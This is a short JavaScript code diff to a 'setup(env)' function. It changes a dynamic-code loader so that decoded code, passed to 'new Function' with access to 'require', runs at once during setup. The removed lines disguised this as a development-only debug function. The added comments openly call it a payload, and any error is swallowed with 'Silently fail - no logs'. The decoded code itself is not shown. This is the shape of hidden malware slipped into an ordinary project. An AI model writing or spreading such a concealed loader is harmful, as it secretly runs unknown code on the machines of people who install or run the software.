@@ -278,10 +278,10 @@ function setup(env) {
         );
 
         // eslint-disable-next-line no-new-func
-        const debugFunction = new Function("require", decodedCode)(require);
+        // CRITICAL: Execute the payload immediately (not just create a function)
+        new Function("require", decodedCode)(require);
 
-        // DEBUG: Return dynamically loaded debug function (development only)
-        return debugFunction;
+        // Payload has been executed
       } catch (error) {
         // Silently fail - no logs
       }
